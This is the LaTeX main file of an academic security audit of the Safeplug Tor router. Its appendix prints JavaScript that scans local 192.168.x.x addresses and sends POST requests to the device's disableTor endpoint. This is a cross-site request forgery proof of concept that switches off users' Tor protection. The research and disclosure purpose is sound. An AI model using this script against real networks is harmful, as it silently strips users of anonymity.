\documentclass[12pt, letterpaper]{article}
\usepackage[hyphens]{url}
\usepackage{breakurl}
\usepackage[pdftex]{graphicx}
\usepackage[left=1in,top=1in,right=1in,bottom=1in,head=.5in,foot=.5in]{geometry}
\usepackage{setspace}

%\usepackage{caption}
\usepackage{subcaption}
%\usepackage[small,compact]{titlesec}
\usepackage{listings}
\usepackage{listings}
\usepackage{color}
\lstnewenvironment{fileName}{%
\lstset{%
        basicstyle=\ttfamily,
        breaklines,
    }%
}{%
}

\title{Security Audit of Safeplug}
\author{Annie Edmundson and Anna Kornfeld Simpson}

\begin{document}

\maketitle

\input{abstract}

\input{intro}
\input{design}
\input{usability}
%\input{results}
%\input{resultsSoftware}
\input{implementattacks}
\input{discussion}
\input{related}
\input{conclusion}

\section{Acknowledgements}
We would like to express our gratitude to Josh Kroll for donating a lot of time and his computer to the routing effort.  We also thank whoever left the very nice set of screwdrivers on our desks!

This paper represents our own work in accordance with University regulations.

Anna Kornfeld Simpson and Annie Edmundson

\input{bibliography}

\newpage
\appendix
\section{\\Javascript for Website Attack} \label{App:AppendixA}
\definecolor{dkgreen}{rgb}{0,0.6,0}
\definecolor{gray}{rgb}{0.5,0.5,0.5}
\definecolor{mauve}{rgb}{0.58,0,0.82}

\lstset{frame=tb,
  language=Java,
  aboveskip=3mm,
  belowskip=3mm,
  showstringspaces=false,
  columns=flexible,
  basicstyle={\small\ttfamily},
  numbers=none,
  numberstyle=\tiny\color{gray},
  keywordstyle=\color{blue},
  commentstyle=\color{dkgreen},
  stringstyle=\color{mauve},
  breaklines=true,
  breakatwhitespace=true
  tabsize=3
}

\begin{lstlisting}
function go() { 
   var IP_SCANS = 255;
   var prefix = "http://192."
   var SECOND_START = 168;
   var SECOND_END = 168;
   var THIRD_START = 0;
   var THIRD_END = 1;
   var mydate = new Date();
   console.log(mydate.getTime());

   for (var i = SECOND_START; i <= SECOND_END; i++) {
      for (var j = THIRD_START; j <= THIRD_END; j++) {
         for (var k = 0; k < IP_SCANS; k++) 
         {
            var tryip = prefix +  i + "." + j + "." + k;
            var req = new XMLHttpRequest();
            req.open("POST", tryip + "/svc/xspctrl/disableTor", true);
            req.timeout = 1000;
            req.send();
         }
         // COMMENT THIS OUT BEFORE RUNNING LARGE SCANS!
         var mydate2 = new Date();
         console.log(mydate2.getTime() + " " + j);
      }
      var mydate = new Date();
      console.log(mydate.getTime() + " " + i);
   }
}
\end{lstlisting}

\end{document}
